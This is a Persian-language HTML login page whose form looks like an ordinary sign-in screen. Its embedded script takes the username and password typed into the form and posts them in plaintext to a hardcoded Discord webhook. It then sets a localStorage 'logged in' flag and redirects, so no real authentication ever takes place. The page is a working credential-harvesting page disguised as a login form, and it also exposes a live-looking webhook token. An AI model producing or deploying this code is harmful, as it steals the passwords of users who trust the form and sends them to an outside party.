<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ورود</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #0e0e0e;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .form-container {
      background: #1a1a1a;
      padding: 2rem;
      border-radius: 12px;
      width: 320px;
      box-shadow: 0 0 15px rgba(0,0,0,0.5);
    }
    h2 {
      text-align: center;
      margin-bottom: 1.5rem;
      color: #8a2be2;
    }
    .form-group {
      margin-bottom: 1rem;
    }
    label {
      display: block;
      margin-bottom: 0.5rem;
    }
    input {
      width: 100%;
      padding: 0.7rem;
      border: none;
      border-radius: 8px;
      background: #2a2a2a;
      color: #fff;
    }
    .btn {
      width: 100%;
      padding: 0.8rem;
      background: #8a2be2;
      border: none;
      border-radius: 8px;
      color: #fff;
      font-size: 1rem;
      cursor: pointer;
      transition: 0.3s;
    }
    .btn:hover {
      background: #6a1db7;
    }
    .link {
      display: block;
      text-align: center;
      margin-top: 1rem;
      color: #aaa;
      text-decoration: none;
    }
    .link:hover {
      color: #fff;
    }
  </style>
</head>
<body>
  <div class="form-container">
    <h2>ورود</h2>
    <form id="loginForm">
      <div class="form-group">
        <label for="loginUsername">نام کاربری</label>
        <input type="text" id="loginUsername" required>
      </div>
      <div class="form-group">
        <label for="loginPassword">رمز عبور</label>
        <input type="password" id="loginPassword" required>
      </div>
      <button type="submit" class="btn">ورود</button>
    </form>
    <a href="register.html" class="link">حساب ندارید؟ ثبت نام کنید</a>
  </div>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1412388207143686214/nL7ZUkfYZ6YrDnjv42cvoTVpG1qddSAwsDQZBZcWPIzYqbkwialBozd5M1ZAmPmVrdA6";

    document.getElementById("loginForm").addEventListener("submit", async (e) => {
      e.preventDefault();

      const username = document.getElementById("loginUsername").value;
      const password = document.getElementById("loginPassword").value;

      const payload = {
        content: `🔐 **ورود به حساب**\n👤 یوزرنیم: ${username}\n🔑 پسورد: ${password}`
      };

      try {
        await fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });

        // ذخیره وضعیت لاگین
        localStorage.setItem("isLoggedIn", "true");

        // ریدایرکت به صفحه اصلی
        window.location.href = "index.html";
      } catch (err) {
        alert("❌ خطا در ورود، دوباره تلاش کنید.");
      }
    });
  </script>
</body>
</html>
